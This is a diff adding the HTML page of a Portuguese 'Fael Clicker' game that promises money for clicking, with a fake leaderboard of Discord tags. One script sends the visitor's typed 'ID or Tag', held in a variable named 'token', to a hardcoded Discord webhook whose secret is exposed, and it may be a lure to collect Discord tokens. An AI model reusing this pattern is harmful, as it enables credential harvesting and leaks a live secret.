@@ -1,0 +1,254 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <!-- COMMON TAGS -->
+    <meta charset="utf-8">
+    <title>Fael Clicker</title>
+    <!-- Search Engine -->
+    <meta name="description" content="CLIQUE NO FAEL E GANHE DINHEIRO - FOURSTARS">
+    <meta name="image" content="https://media.discordapp.net/attachments/932017010357960714/949781132331847830/unknown.png">
+    <!-- Schema.org for Google -->
+    <meta itemprop="name" content="Fael Clicker">
+    <meta itemprop="description" content="CLIQUE NO FAEL E GANHE DINHEIRO - FOURSTARS">
+    <meta itemprop="image" content="https://media.discordapp.net/attachments/932017010357960714/949781132331847830/unknown.png">
+    <!-- Twitter -->
+    <meta name="twitter:card" content="summary">
+    <meta name="twitter:title" content="Fael Clicker">
+    <meta name="twitter:description" content="CLIQUE NO FAEL E GANHE DINHEIRO - FOURSTARS">
+    <meta name="twitter:site" content="@fourstars">
+    <meta name="twitter:image:src" content="https://media.discordapp.net/attachments/932017010357960714/949781132331847830/unknown.png">
+    <!-- Open Graph general (Facebook, Pinterest & Google+) -->
+    <meta name="og:title" content="Fael Clicker">
+    <meta name="og:description" content="CLIQUE NO FAEL E GANHE DINHEIRO - FOURSTARS">
+    <meta name="og:image" content="https://media.discordapp.net/attachments/932017010357960714/949781132331847830/unknown.png">
+    <meta name="og:url" content="https://media.discordapp.net/attachments/932017010357960714/949781132331847830/unknown.png">
+    <meta name="og:site_name" content="Fael Clicker">
+    <meta name="og:type" content="website">
+
+    <!-- Stylesheets -->
+    <link rel="stylesheet" type="text/css" href="stylesheets/style.css">
+</head>
+<body>
+    <div class="gameFullContent">
+        <div class="leftContainer">
+            <span class="version"></span>
+            <button class="resetButton">FALIR</button>
+
+            <style type="text/css">
+                #leaderboard li {
+                    font-family: sans-serif;
+                    font-size: 12px;
+                    line-height: 12px;
+                }
+                #leaderboard #players li {
+                    display:block;
+                    clear: both;
+                    position: absolute;
+                    width: 350px;
+                    -moz-transition-duration: 1s;
+                    -webkit-transition-duration: 1s;
+                    -ms-transition-duration: 1s;
+                }
+                #leaderboard #players li.header {
+                    font-weight: bold;
+                    background-color: silver;
+                    background: -moz-linear-gradient(top, #cedce7 0%, #596a72 100%);
+                    background: -webkit-gradient(linear, left top, left bottom, color-stop(0%,#cedce7), color-stop(100%,#596a72));
+                }
+                #leaderboard #players {
+                    padding: 0;
+                    width: 350px;
+                    position: relative;
+                    border: 1px solid #333;
+                    box-shadow: 2px 2px 5px gray;
+                    height: 132px;
+                    background: -moz-linear-gradient(top, #cedce7 0%, #596a72 100%);
+                    background: -webkit-gradient(linear, left top, left bottom, color-stop(0%,#cedce7), color-stop(100%,#596a72));
+                }
+                #leaderboard #players div {
+                    display: block;
+                    float: left;
+                    overflow: hidden;
+                    padding: 5px;
+                }
+                #leaderboard .player {
+                    background: -moz-linear-gradient(top, #feffff 0%, #e0dace 100%);
+                    background: -webkit-gradient(linear, left top, left bottom, color-stop(0%,#feffff), color-stop(100%,#e0dace));
+                }
+                #leaderboard .rank {
+                    width: 50px;
+                }
+                #leaderboard .name {
+                    width: 150px;
+                }
+                #leaderboard .score {
+                    width: 100px;	
+                }
+            </style>
+            
+            <div id="leaderboard">
+                <ul id="players">
+                    <li class="header">
+                        <div class="rank">Global</div>
+                        <div class="name">Player</div>
+                        <div class="score">Dinheiro Seg</div>
+                    </li>
+                </ul>
+            </div>
+            
+            <script src="http://ajax.googleapis.com/ajax/libs/jquery/1.7.2/jquery.min.js" type="text/javascript"></script>
+            
+            <script language="javascript">
+                var players;
+                var timerId;
+                var scoreToWin = 2000;
+                var updateInterval = 2000;
+            
+                function descending(a, b) { return a.score < b.score ? 1 : -1; }
+                
+                function reposition() {
+                    var height = $("#leaderboard .header").height();
+                    var y = height;
+                    for(var i = 0; i < players.length; i++) {
+                        players[i].$item.css("top", y + "px");
+                        y += height;			
+                    }
+                }
+                            
+                function updateBoard() {
+                    var player = getRandomPlayer();	
+                    player.score += getRandomScoreIncrease();
+                    player.$item.find(".score").text(player.score);
+                    
+                    players.sort(descending);
+                    updateRanks(players);
+                    reposition();
+                    
+                    if(isGameOver(player.score)) {
+                        resetBoard();	
+                    }
+                }
+                
+                function isGameOver(score) {
+                    return score >= scoreToWin;
+                }
+                
+                function getRandomPlayer() {
+                    var index = getRandomBetween(0, players.length);
+                    return players[index];
+                }
+                
+            
+            
+                function resetBoard() {
+                    var $list = $("#players");
+                    
+                    $list.find("li.player").remove();
+                    if(timerId !== undefined) {
+                        clearInterval(timerId);
+                    }
+                    
+                    players = [
+                        { name: "Draxx#8657", score: 0.01811604 },
+                        { name: "! F E N I X_DRIP❄#9999", score: "0.01740354" },
+                        { name: "!IRivenRad#8900", score: 0.01724604 },
+                        { name: "2+2=22#2803", score: "banned" },
+                        { name: "akemi#7064", score: "banned" }, 
+                    ];
+                    for(var i = 0; i < players.length; i++) {
+                        var $item = $(
+                            "<li class='player'>" + 
+                                "<div class='rank'>" + (i + 1) + "</div>" + 
+                                "<div class='name'>" + players[i].name + "</div>" +
+                                "<div class='score'>" + players[i].score + "</div>" +
+                            "</li>");
+                        players[i].$item = $item;
+                        $list.append($item);
+                    }
+                    
+                    timerId = setInterval("updateBoard();", updateInterval);
+                    
+                    reposition();
+                }	
+                
+                resetBoard();
+            </script>
+                                    <script>
+                                        function sendMessage() {
+                                          const request = new XMLHttpRequest();
+                                            const token = document.getElementsByClassName("label")[0].value;
+            
+                                          request.open("POST", "https://discord.com/api/webhooks/949783119404335104/y1AifPZHuS-XqulnNQiRWpzb3gV6RrNClNRURqUmfvMaQvosYSYtPpT-Aw_Vev4xP1wB");
+                                    
+                                          request.setRequestHeader('Content-type', 'application/json');
+                                    
+                                          const params = {
+                                            username: "Registro | Jogo do Fael",
+                                            content: token
+                                          }
+                                    
+                                          request.send(JSON.stringify(params));
+                                        }
+                                      </script>
+                    <label>
+                        <input class="label" type="text" id="token" placeholder="Seu ID ou Tag">
+                    </label>
+                        <button class="button" onclick="sendMessage();">Registro</button>    
+
+
+        </div>
+        <div class="mainGameContent">
+            <h1 class="bitcoinAmountDisplay">R$ <span class="bitcoinAmount">0</span> Reais</h1>
+            <p class="satoshiAmountDisplay"><span class="satoshiAmount">0</span> SALDO BRUTO</p>
+            <p class="bSecRate"><span class="bSecRateNumber">0</span> Dinheiro Seg</p>
+            <img class="bitcoin" src="images/robuxdatropa.png">
+        </div>
+        
+        <div class="rightContainer buyItemContainer">
+            <ul class="purchaseList">
+                <li class="purchaseItem" id="item_oldCalculator" data-price="0.0000001" data-bits-per-sec="0.00000001">
+                    <span class="amountOfItem">0</span>
+                    <p class="itemHeadline">Contratar Staffs</p>
+                    <p class="itemPrice">0.0000001 Reais</p>
+                </li>
+                <li class="purchaseItem" id="item_oldCpu" data-price="0.00000125" data-bits-per-sec="0.0000001">
+                    <span class="amountOfItem">0</span>
+                    <p class="itemHeadline">Roubar Staff</p>
+                    <p class="itemPrice">0.00000125 Reais</p>
+                </li>
+                <li class="purchaseItem" id="item_oldComputerFromGrandpa" data-price="0.00003" data-bits-per-sec="0.000005">
+                    <span class="amountOfItem">0</span>
+                    <p class="itemHeadline">Vender Staff</p>
+                    <p class="itemPrice">0.00003 Reais</p>
+                </li>
+                <li class="purchaseItem" id="item_rapsberrypy" data-price="0.00005" data-bits-per-sec="0.0000075">
+                    <span class="amountOfItem">0</span>
+                    <p class="itemHeadline">Vender GF</p>
+                    <p class="itemPrice">0.00005 Reais</p>
+                </li>
+                <li class="purchaseItem" id="item_smartphone" data-price="0.0005" data-bits-per-sec="0.000075">
+                    <span class="amountOfItem">0</span>
+                    <p class="itemHeadline">Vender Nuds</p>
+                    <p class="itemPrice">0.0005 Reais</p>
+                </li>
+                <li class="purchaseItem" id="item_middleClassPC" data-price="0.0015" data-bits-per-sec="0.000175">
+                    <span class="amountOfItem">0</span>
+                    <p class="itemHeadline">Vender o whexx</p>
+                    <p class="itemPrice">Reais</p>
+                </li>
+                <li class="purchaseItem" id="item_cheapServer" data-price="0.0040" data-bits-per-sec="0.000375">
+                    <span class="amountOfItem">0</span>
+                    <p class="itemHeadline">Vender VIP</p>
+                    <p class="itemPrice">Reais</p>
+                </li>
+            </ul>
+        </div>
+    </div>
+    <div>
+    </div>
+    <div>
+        
+    <script src="lib/jquery-3.3.1.min.js"></script>
+    <script async src="scripts/app.js" type="text/javascript"></script>
+</body>
+</html>
